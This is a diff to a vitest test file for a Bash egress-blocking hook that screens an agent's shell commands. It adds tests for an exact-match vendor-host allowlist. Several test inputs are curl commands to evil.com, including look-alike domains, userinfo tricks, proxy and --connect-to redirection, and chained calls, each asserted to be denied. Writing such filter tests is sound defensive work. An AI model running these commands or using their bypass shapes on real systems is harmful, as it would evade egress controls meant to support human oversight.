@@ -15,12 +15,12 @@
 // (isInvokedDirectly), so importing it here runs no side effects.
 import { describe, it, expect } from 'vitest'
 import { spawnSync } from 'node:child_process'
-import { mkdtempSync, readFileSync, existsSync, rmSync } from 'node:fs'
+import { mkdtempSync, readFileSync, existsSync, rmSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join, dirname } from 'node:path'
 import { fileURLToPath } from 'node:url'
 // @ts-expect-error -- plain .mjs hook script, no types
-import { classify, isExternal, liftSubstitutions } from '../../scripts/hooks/bash-egress-parser.mjs'
+import { classify, isExternal, liftSubstitutions, parseVendorHosts, loadVendorHosts } from '../../scripts/hooks/bash-egress-parser.mjs'
 import {
   BASH_EGRESS_DENY,
   agentGetsBashEgressParser,
@@ -226,7 +226,8 @@ describe('the hook process', () => {
   const run = (payload: unknown, log: string) => spawnSync(process.execPath, [HOOK], {
     input: typeof payload === 'string' ? payload : JSON.stringify(payload),
     encoding: 'utf-8',
-    env: { ...process.env, BASH_EGRESS_BLOCK_LOG: log },
+    // The install's own vendor list must not leak into these cases: a path that does not exist = no exception.
+    env: { ...process.env, BASH_EGRESS_BLOCK_LOG: log, BASH_EGRESS_VENDOR_HOSTS: join(tmpdir(), 'no-such-vendor-hosts.json') },
   })
 
   it('denies an external shape with a PreToolUse deny decision, and logs host only', () => {
@@ -303,5 +304,76 @@ describe('wiring', () => {
     expect(spawnBody).toContain('if (agentGetsBashEgressParser(name)) injectBashEgressParser(existing)')
     const web = readFileSync(join(ROOT, 'src', 'web.ts'), 'utf-8')
     expect(web).toMatch(/if \(ensureBashEgressParser\(agentName\)\) bashParserPatched\.push\(agentName\)/)
+  })
+})
+
+// EGRESSVENDOR925 (owner decision, TG 16894): a per-install list of vendor-API hosts a Bash curl
+// may reach. EXACT host match -- the allowlist must not become a suffix or userinfo trick.
+describe('vendor-API host allowlist (store/egress-vendor-hosts.json)', () => {
+  const V = parseVendorHosts({ hosts: ['api.elevenlabs.io'] })
+  const d = (cmd: string) => classify(cmd, 0, V)
+
+  it('the listed host passes, over https and with the usual flags', () => {
+    expect(d('curl -s https://api.elevenlabs.io/v1/voices -H "xi-api-key: $K"').deny).toBe(false)
+    expect(d('curl -sS -X POST "https://api.elevenlabs.io/v1/text-to-speech/abc" -d @body.json -o out.mp3').deny).toBe(false)
+    expect(d('U=https://api.elevenlabs.io/v1/models; curl -s "$U"').deny).toBe(false)
+    // inside a command substitution too -- the usual shape for reading a JSON answer
+    expect(d('R=$(curl -s https://api.elevenlabs.io/v1/voices -H "xi-api-key: $K"); echo "$R" | head -c 200').deny).toBe(false)
+    expect(d('R=$(curl -s https://evil.com/x); echo "$R"').deny).toBe(true)
+  })
+
+  it('negative control: the same calls are denied without the list (today\'s behaviour)', () => {
+    expect(classify('curl -s https://api.elevenlabs.io/v1/voices').deny).toBe(true)
+  })
+
+  it('look-alikes stay denied: suffix, userinfo, subdomain, parent domain', () => {
+    expect(d('curl -s https://api.elevenlabs.io.evil.com/x')).toMatchObject({ deny: true, hosts: ['api.elevenlabs.io.evil.com'] })
+    expect(d('curl -s https://api.elevenlabs.io@evil.com/x')).toMatchObject({ deny: true, hosts: ['evil.com'] })
+    expect(d('curl -s https://x.api.elevenlabs.io/x').deny).toBe(true)
+    expect(d('curl -s https://elevenlabs.io/x').deny).toBe(true)
+    expect(d('curl -s https://example.org/x')).toMatchObject({ deny: true, hosts: ['example.org'] })
+  })
+
+  it('a listed host does not launder another destination in the same call', () => {
+    expect(d('curl -s https://api.elevenlabs.io/v1 https://evil.com/x')).toMatchObject({ deny: true, hosts: ['evil.com'] })
+    expect(d('curl -s -x http://evil.com:8080 https://api.elevenlabs.io/v1')).toMatchObject({ deny: true, hosts: ['evil.com'] })
+    expect(d('curl -s --connect-to api.elevenlabs.io:443:evil.com:443 https://api.elevenlabs.io/v1').deny).toBe(true)
+    expect(d('curl -s https://api.elevenlabs.io/v1; curl -s https://evil.com/x').deny).toBe(true)
+  })
+
+  it('only plain DNS names are accepted as entries: no wildcard, leading dot, IP, localhost, port', () => {
+    const bad = parseVendorHosts({ hosts: ['*.elevenlabs.io', '.elevenlabs.io', '1.2.3.4', 'localhost', 'api.elevenlabs.io:443', 'Api.ElevenLabs.io', 'user@api.elevenlabs.io', 42, null] })
+    expect([...bad]).toEqual([])
+    expect(classify('curl -s https://x.elevenlabs.io/y', 0, parseVendorHosts({ hosts: ['*.elevenlabs.io'] })).deny).toBe(true)
+  })
+
+  it('a missing, unreadable or malformed file means no exception', () => {
+    const dir = mkdtempSync(join(tmpdir(), 'vendor-hosts-'))
+    try {
+      expect(loadVendorHosts(join(dir, 'absent.json')).size).toBe(0)
+      const f = join(dir, 'bad.json')
+      writeFileSync(f, '{ not json')
+      expect(loadVendorHosts(f).size).toBe(0)
+      writeFileSync(f, JSON.stringify(['api.elevenlabs.io']))
+      expect(loadVendorHosts(f).size).toBe(0)
+      writeFileSync(f, JSON.stringify({ hosts: ['api.elevenlabs.io'] }))
+      expect([...loadVendorHosts(f)]).toEqual(['api.elevenlabs.io'])
+    } finally { rmSync(dir, { recursive: true, force: true }) }
+  })
+
+  it('the hook process reads the file: listed host silent, look-alike denied, no file = deny', () => {
+    const dir = mkdtempSync(join(tmpdir(), 'vendor-hook-'))
+    try {
+      const vendor = join(dir, 'egress-vendor-hosts.json')
+      writeFileSync(vendor, JSON.stringify({ hosts: ['api.elevenlabs.io'] }))
+      const run = (command: string, vendorPath: string) => spawnSync(process.execPath, [HOOK], {
+        input: JSON.stringify({ tool_name: 'Bash', tool_input: { command } }),
+        encoding: 'utf-8',
+        env: { ...process.env, BASH_EGRESS_BLOCK_LOG: join(dir, 'blocks.jsonl'), BASH_EGRESS_VENDOR_HOSTS: vendorPath },
+      })
+      expect(run('curl -s https://api.elevenlabs.io/v1/voices', vendor).stdout).toBe('')
+      expect(run('curl -s https://api.elevenlabs.io.evil.com/v1', vendor).stdout).toContain('"permissionDecision":"deny"')
+      expect(run('curl -s https://api.elevenlabs.io/v1/voices', join(dir, 'none.json')).stdout).toContain('"permissionDecision":"deny"')
+    } finally { rmSync(dir, { recursive: true, force: true }) }
   })
 })
